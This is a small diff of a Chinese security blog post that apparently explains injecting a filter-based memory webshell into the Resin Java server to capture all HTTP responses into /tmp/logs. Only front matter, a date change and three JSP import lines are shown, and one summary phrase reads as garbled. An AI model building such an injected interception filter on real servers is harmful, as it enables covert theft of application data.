@@ -1,6 +1,6 @@
 ---
 title: "利用filter机制获取resin请求响应"
-date: 2025-01-07
+date: 2021-09-22
 type: posts
 draft: false
 summary: "在 Resin 中注入 filter 内存马实现窃取接口响应结果，往往经在油中。"
@@ -15,7 +15,7 @@ tags:
 
 实现代码，注入后，所有响应内容将打印到/tmp/logs文件中：
 
-```jsp
+```java
 <%@ page import="java.io.IOException" %>
 <%@ page import="com.caucho.server.webapp.WebApp" %>
 <%@ page import="com.caucho.server.dispatch.FilterConfigImpl" %>
